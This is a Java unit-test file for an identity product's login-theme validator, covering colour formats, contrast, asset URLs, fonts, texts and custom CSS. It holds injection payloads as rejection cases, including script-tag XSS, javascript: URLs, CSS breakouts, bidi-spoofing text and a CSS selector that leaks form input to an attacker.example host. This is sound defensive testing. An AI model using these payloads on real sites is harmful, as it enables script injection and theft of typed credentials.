/*
 * Copyright 2026 HelixIAM contributors
 * SPDX-License-Identifier: Apache-2.0
 */

package io.helixiam.authorization.theme;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.List;
import java.util.Map;
import java.util.Set;

import static io.helixiam.authorization.theme.ThemeFixtures.c;
import static org.assertj.core.api.Assertions.assertThat;

/** Spec §1 validation + the "Validation" tests: colours, ranges, URLs, fonts, texts, WCAG AA contrast, custom CSS. */
class ThemeValidatorTest {

    private final ThemeValidator validator = new ThemeValidator(ThemeFixtures.monthfoldCatalog(),
            Set.of("https://img.monthfold.example"));

    private Map<String, String> realm(final Theme candidate) {
        return validator.validate("firm", ThemeValidator.Scope.REALM, candidate, ThemeDefaults.THEME);
    }

    private static Theme colors(final ThemeColors colors) {
        return Theme.EMPTY.withColors(colors);
    }

    private static ThemeColors only(final String role, final ThemeColor color) {
        return ThemeColors.from(r -> r.equals(role) ? color : null);
    }

    @Test
    void theMonthfoldReferenceTheme_isValid() {
        assertThat(realm(ThemeFixtures.monthfold())).isEmpty();
    }

    @Test
    void theEmptyLayer_isValid() {
        assertThat(realm(Theme.EMPTY)).isEmpty();
    }

    @ParameterizedTest
    @ValueSource(strings = {"red", "#12345", "#1234567", "#12345g", "1f4d47", "#123456; } body { display:none", " #123456"})
    void badColours_areRejected_onTheColourField(final String bad) {
        assertThat(realm(colors(only("primary", c(bad, null))))).containsKey("colors.primary.light");
        assertThat(realm(colors(only("border", c("#dddddd", bad))))).containsKey("colors.border.dark");
    }

    @Test
    void lowContrastInkOnSurface_isRejected_namingThePair() {
        final Map<String, String> errors = realm(colors(only("ink", c("#aaaaaa", null))));
        assertThat(errors).containsKey("contrast.inkOnSurface.light");
        assertThat(errors.get("contrast.inkOnSurface.light")).contains("ink").contains("surface").contains("4.5:1");
    }

    @Test
    void lowContrastTextOnPrimary_isRejected_namingThePair() {
        final Map<String, String> errors = realm(colors(only("primary", c("#ffe14d", null))));
        assertThat(errors).containsKey("contrast.textOnPrimary.light");
        assertThat(errors.get("contrast.textOnPrimary.light")).contains("primary");
    }

    @Test
    void anExplicitDarkValueWithLowContrast_isRejected() {
        final ThemeColors cs = ThemeColors.from(r -> switch (r) {
            case "ink" -> c("#16211f", "#333333");
            case "surface" -> c("#f7f8f6", "#111111");
            default -> null;
        });
        // The dark brand panel uses the same dark ink, so it is named too (review M1).
        assertThat(realm(colors(cs))).containsOnlyKeys("contrast.inkOnSurface.dark", "contrast.brandPanel.dark");
    }

    @Test
    void derivedDarkValues_alwaysPass() {
        for (final String primary : List.of("#1f4d47", "#003399", "#6d28d9", "#b91c1c", "#0f766e", "#1a1a1a")) {
            assertThat(realm(colors(only("primary", c(primary, null))))).as(primary).isEmpty();
        }
        assertThat(realm(colors(only("surface", c("#fdf6e3", null))))).isEmpty();
    }

    @Test
    void contrastIsOnlyCheckedForPairsTheLayerTouches() {
        // The layer below already fails (e.g. migrated legacy data); a layer that only sets a logo is still valid.
        final Theme below = ThemeMerger.merge(ThemeDefaults.THEME, colors(only("ink", c("#bbbbbb", null))));
        final Theme logoOnly = Theme.EMPTY.withAssets(new ThemeAssets("https://cdn.example/logo.svg", null, null, null));
        assertThat(validator.validate("firm", ThemeValidator.Scope.ORGANIZATION, logoOnly, below)).isEmpty();
        assertThat(validator.validate("firm", ThemeValidator.Scope.ORGANIZATION,
                colors(only("surface", c("#ffffff", null))), below)).containsKey("contrast.inkOnSurface.light");
    }

    @ParameterizedTest
    @ValueSource(strings = {"http://cdn.example/logo.png", "javascript:alert(1)", "data:image/png;base64,AAAA",
            "//cdn.example/logo.png", "logo.png", "https://cdn.example/a\" onerror=\"x", "https://cdn.example/a b.png",
            "https://user:pw@cdn.example/logo.png", "https:///logo.png", "/realms/other/theme/assets/logo01.svg",
            "/realms/firm/theme/assets/../../x.svg", "/realms/firm/theme/assets/logo01.exe",
            "/realms/firm/theme/assets/unknown.svg"})
    void nonHttpsOrForeignAssetUrls_areRejected(final String url) {
        for (final String field : List.of("logoUrl", "logoDarkUrl", "faviconUrl", "brandImageUrl")) {
            final ThemeAssets assets = new ThemeAssets(field.equals("logoUrl") ? url : null,
                    field.equals("logoDarkUrl") ? url : null, field.equals("faviconUrl") ? url : null,
                    field.equals("brandImageUrl") ? url : null);
            assertThat(realm(Theme.EMPTY.withAssets(assets))).as(field + "=" + url).containsKey("assets." + field);
        }
    }

    @Test
    void theRealmsOwnUploadedAssets_andHttpsUrls_areAccepted() {
        assertThat(realm(Theme.EMPTY.withAssets(new ThemeAssets("/realms/firm/theme/assets/logo01.svg",
                "https://cdn.example/logo-dark.svg", "https://cdn.example/favicon.png", null)))).isEmpty();
    }

    @Test
    void links_mustBeHttps() {
        final Theme t = new Theme(null, null, null, null, null, null,
                new ThemeLinks("http://x.example/privacy", "javascript:alert(1)", "https://x.example/help"), null);
        assertThat(realm(t)).containsOnlyKeys("links.privacyUrl", "links.termsUrl");
    }

    @Test
    void typographyAndShapeRanges() {
        assertThat(realm(new Theme(null, new ThemeTypography(null, null, 13), null, null, null, null, null, null)))
                .containsKey("typography.baseSize");
        assertThat(realm(new Theme(null, new ThemeTypography(null, null, 19), null, null, null, null, null, null)))
                .containsKey("typography.baseSize");
        assertThat(realm(new Theme(null, null, new ThemeShape(-1, null), null, null, null, null, null)))
                .containsKey("shape.radius");
        assertThat(realm(new Theme(null, null, new ThemeShape(17, "roomy"), null, null, null, null, null)))
                .containsKeys("shape.radius", "shape.density");
        assertThat(realm(new Theme(null, new ThemeTypography("system-serif", "system-mono", 14), new ThemeShape(0, "compact"),
                null, null, null, null, null))).isEmpty();
    }

    @Test
    void fonts_mustBeBuiltInOrUploaded() {
        assertThat(realm(new Theme(null, new ThemeTypography("Comic Sans", null, null), null, null, null, null, null, null)))
                .containsKey("typography.fontSans");
        assertThat(realm(new Theme(null, new ThemeTypography(null, "x'; } body {", null), null, null, null, null, null, null)))
                .containsKey("typography.fontDisplay");
        assertThat(validator.validate("other", ThemeValidator.Scope.REALM,
                new Theme(null, new ThemeTypography("Public Sans", null, null), null, null, null, null, null, null),
                ThemeDefaults.THEME)).as("another realm's font").containsKey("typography.fontSans");
    }

    @Test
    void layout() {
        assertThat(realm(new Theme(null, null, null, null, new ThemeLayout("sideways", null, null), null, null, null)))
                .containsKey("layout.layout");
        assertThat(realm(new Theme(null, null, null, null, new ThemeLayout(null, null, List.of()), null, null, null)))
                .containsKey("layout.supportedLocales");
        assertThat(realm(new Theme(null, null, null, null, new ThemeLayout(null, null, List.of("en", "not a locale")), null,
                null, null))).containsKey("layout.supportedLocales");
        assertThat(realm(new Theme(null, null, null, null, new ThemeLayout("centered", true, List.of("en", "nl", "pt-BR")),
                null, null, null))).isEmpty();
    }

    @Test
    void texts_arePlainText_withLimits() {
        assertThat(realm(Theme.EMPTY.withTexts(new ThemeTexts(LocalizedText.of("<script>alert(1)</script>"),
                null, null, null, null, null)))).containsKey("texts.brandHeadline");
        assertThat(realm(Theme.EMPTY.withTexts(new ThemeTexts(null, null, null,
                LocalizedText.of("x".repeat(501)), null, null)))).containsKey("texts.welcomeText");
        assertThat(realm(Theme.EMPTY.withTexts(new ThemeTexts(null, null, null, null,
                new LocalizedText(Map.of("<bad>", "Footer")), null)))).containsKey("texts.footerText");
        assertThat(realm(Theme.EMPTY.withTexts(new ThemeTexts(null, null, null, null, null,
                LocalizedList.of(List.of("ISO 27001", "<img src=x>")))))).containsKey("texts.brandBadges");
        assertThat(realm(Theme.EMPTY.withTexts(new ThemeTexts(new LocalizedText(Map.of("en", "Hi", "nl", "Hoi")),
                null, null, LocalizedText.of("Welcome & good luck"), null, LocalizedList.of(List.of("SOC 2")))))).isEmpty();
    }

    @Test
    void customCss_isValidated_andIsRealmOnly() {
        assertThat(realm(Theme.EMPTY.withCustomCss("</style><script>alert(1)</script>")))
                .hasEntrySatisfying("customCss", m -> assertThat(m).contains("<"));
        assertThat(realm(Theme.EMPTY.withCustomCss(".a { color: #123456 }"))).isEmpty();
        assertThat(validator.validate("firm", ThemeValidator.Scope.ORGANIZATION,
                Theme.EMPTY.withCustomCss(".a { color: #123456 }"), ThemeDefaults.THEME)).containsKey("customCss");
    }

    @Test
    void customCss_cannotFetchFromAnOriginTheAdminIntroducedAsAnAsset() {
        // Review C2: a logo URL on the attacker's host must not make that host "allowlisted" for CSS url().
        final Theme t = Theme.EMPTY.withAssets(new ThemeAssets("https://attacker.example/logo.png", null, null, null))
                .withCustomCss("input[value^=a]{background:url(https://attacker.example/a)}");
        assertThat(realm(t)).containsOnlyKeys("customCss");
        final Theme below = ThemeMerger.merge(ThemeDefaults.THEME,
                Theme.EMPTY.withAssets(new ThemeAssets(null, null, null, "https://attacker.example/hero.webp")));
        assertThat(validator.validate("firm", ThemeValidator.Scope.REALM,
                Theme.EMPTY.withCustomCss(".b{background:url(https://attacker.example/x)}"), below)).containsKey("customCss");
    }

    @Test
    void customCss_mayUseTheOperatorAllowlist_andTheRealmsOwnUploadedAssets() {
        assertThat(realm(Theme.EMPTY.withCustomCss(".b{background:url(https://img.monthfold.example/x.png)}"))).isEmpty();
        assertThat(realm(Theme.EMPTY.withCustomCss(".b{background:url(/realms/firm/theme/assets/logo01.svg)}"))).isEmpty();
        assertThat(realm(Theme.EMPTY.withCustomCss(".b{background:url(/realms/firm/theme/assets/nope.svg)}")))
                .as("not uploaded").containsKey("customCss");
    }

    @Test
    void imageOrigins_forImgSrc_includeTheThemesOwnImages_butTheCssAllowlistDoesNot() {
        final Theme t = Theme.EMPTY.withAssets(new ThemeAssets("https://cdn.example/logo.svg", null, null, null));
        assertThat(validator.imageOrigins(t)).contains("https://cdn.example", "https://img.monthfold.example");
        assertThat(validator.cssUrlOrigins()).containsExactly("https://img.monthfold.example");
    }

    @ParameterizedTest
    @ValueSource(strings = {"Sign in at \u202egro.live\u202c", "a\u202ab", "a\u202bb", "a\u202db", "a\u2066b",
            "a\u2067b", "a\u2068b", "a\u2069b", "a\u200bb", "a\ufeffb", "a\u0000b", "a\u0007b", "a\u009bb",
            "a\rb", "a\tb"})
    void texts_rejectBidiControlsAndInvisibleCharacters(final String text) {
        assertThat(realm(Theme.EMPTY.withTexts(new ThemeTexts(LocalizedText.of(text), null, null, null, null, null))))
                .as(text).containsKey("texts.brandHeadline");
        assertThat(realm(Theme.EMPTY.withTexts(new ThemeTexts(null, null, null, null, null,
                LocalizedList.of(List.of(text)))))).as(text).containsKey("texts.brandBadges");
    }

    @Test
    void texts_allowNewlinesAndOrdinaryUnicode() {
        assertThat(realm(Theme.EMPTY.withTexts(new ThemeTexts(null, null, null,
                LocalizedText.of("Welkom bij Café Ærø — 月報\nTot ziens"), null, null)))).isEmpty();
    }

    // ---- Task 3 review M1: the brand panel's own pairs (its dark ground, its accent) are checked too.

    @Test
    void anIllegibleDarkBrandPanel_isRejected_namingThePair() {
        // ink.dark close to the dark sunken surface the dark brand panel is built from.
        final Theme layer = colors(ThemeColors.from(r -> switch (r) {
            case "ink" -> c("#16211f", "#3a4a46");
            case "surfaceSunken" -> c("#eef1ee", "#2b3835");
            default -> null;
        }));
        final Map<String, String> errors = realm(layer);
        assertThat(errors).containsKey("contrast.brandPanel.dark");
        assertThat(errors.get("contrast.brandPanel.dark")).contains("Brand panel").contains("4.5:1");
    }

    @Test
    void brandPanelPairsAreOnlyCheckedWhenTheLayerTouchesTheirColours() {
        assertThat(realm(colors(only("negative", c("#b3401b", null))))).doesNotContainKeys(
                "contrast.brandPanel.dark");
    }
}
